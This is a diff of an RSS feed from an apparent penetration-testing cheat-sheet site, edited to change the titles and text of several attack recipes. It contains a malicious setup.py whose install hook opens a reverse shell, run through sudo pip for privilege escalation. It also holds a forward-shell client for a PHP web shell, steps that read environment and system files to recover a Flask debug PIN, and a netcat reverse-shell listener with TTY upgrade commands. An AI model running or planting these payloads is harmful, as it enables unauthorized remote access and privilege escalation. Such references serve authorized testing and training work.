@@ -22,11 +22,11 @@
       <description>Python Forward Shell Template #!/usr/bin/env python3 from cmd import Cmd import requests class Term(Cmd): prompt = &amp;#34;shell&amp;gt; &amp;#34; def default(self, args): response = requests.get(&amp;#34;http://example.com/cmd.php&amp;#34;, params = {&amp;#34;cmd&amp;#34;: args}, proxies={&amp;#34;http&amp;#34;:&amp;#34;http://127.0.0.1:8080&amp;#34;}) print(response.text) term = Term() term.cmdloop() </description>
     </item>
     <item>
-      <title>pip</title>
+      <title>Pip</title>
       <link>https://tldrbins.github.io/pip/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/pip/</guid>
-      <description>SUDO 1. Create a setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;&amp;lt;LOCAL_IP&amp;gt;&amp;#34;,&amp;lt;LOCAL_PORT&amp;gt;)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup( cmdclass={ &amp;#34;install&amp;#34;: Exploit } ) 2. Exploit # Run sudo pip install . </description>
+      <description>Privesc #1: Create a Malicious Package 1. Create a setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;&amp;lt;LOCAL_IP&amp;gt;&amp;#34;,&amp;lt;LOCAL_PORT&amp;gt;)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup( cmdclass={ &amp;#34;install&amp;#34;: Exploit } ) 2. Exploit # Run sudo pip install . </description>
     </item>
     <item>
       <title>Pypi</title>
@@ -47,14 +47,14 @@
       <link>https://tldrbins.github.io/retrieve_flask_debug_pin/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/retrieve_flask_debug_pin/</guid>
-      <description>Retrieve Flask Debug Pin 1. Get user cat /proc/self/environ | grep -aE (&amp;#39;USER&amp;#39;|&amp;#39;LOGNAME&amp;#39;) $ cat /proc/self/environ LANG=C.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin HOME=/var/www LOGNAME=www-data USER=www-data ---[SNIP]--- $ cat /proc/self/environ | grep -aE (&amp;#39;USER&amp;#39;|&amp;#39;LOGNAME&amp;#39;) LOGNAME=www-data USER=www-data 2. Get full path of the application +------------------------------+ | Get from Traceback debug log | +------------------------------+ Traceback (most recent call last) File &amp;#34;/app/venv/lib/python3.10/site-packages/flask/app.py&amp;#34;, line 2528, in wsgi_app response = self.handle_exception(e) ---[SNIP]--- 3. Get MAC address cat /sys/class/net/eth0/address $ cat /sys/class/net/eth0/address 00:50:56:b9:2e:50 # Convert to int python3 -c &amp;#34;print(int(&amp;#39;&amp;lt;MAC_ADDRESS&amp;gt;&amp;#39;.</description>
+      <description>Retrieve Flask Debug Pin 1. Get User cat /proc/self/environ | grep -aE (&amp;#39;USER&amp;#39;|&amp;#39;LOGNAME&amp;#39;) $ cat /proc/self/environ LANG=C.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin HOME=/var/www LOGNAME=www-data USER=www-data ---[SNIP]--- $ cat /proc/self/environ | grep -aE (&amp;#39;USER&amp;#39;|&amp;#39;LOGNAME&amp;#39;) LOGNAME=www-data USER=www-data 2. Get full path of the application +------------------------------+ | Get from Traceback debug log | +------------------------------+ Traceback (most recent call last) File &amp;#34;/app/venv/lib/python3.10/site-packages/flask/app.py&amp;#34;, line 2528, in wsgi_app response = self.handle_exception(e) ---[SNIP]--- 3. Get MAC Address cat /sys/class/net/eth0/address $ cat /sys/class/net/eth0/address 00:50:56:b9:2e:50 # Convert to int python3 -c &amp;#34;print(int(&amp;#39;&amp;lt;MAC_ADDRESS&amp;gt;&amp;#39;.</description>
     </item>
     <item>
       <title>Upgrade Shell</title>
       <link>https://tldrbins.github.io/upgrade_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/upgrade_shell/</guid>
-      <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; $ rlwrap nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 33490 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; tomcat@kotarak-dmz:/$ zsh: suspended rlwrap nc -lvnp 1337 # Ctrl-Z to send the process to background, then stty raw -echo; fg $ stty raw -echo; fg [1] + continued rlwrap nc -lvnp 1337 tomcat@kotarak-dmz:/$ # Start a local http server python3 -m http.</description>
+      <description>Check Installed Binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; $ rlwrap nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 33490 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; tomcat@kotarak-dmz:/$ zsh: suspended rlwrap nc -lvnp 1337 # Ctrl-Z to send the process to background, then stty raw -echo; fg $ stty raw -echo; fg [1] + continued rlwrap nc -lvnp 1337 tomcat@kotarak-dmz:/$ # Start a local http server python3 -m http.</description>
     </item>
   </channel>
 </rss>
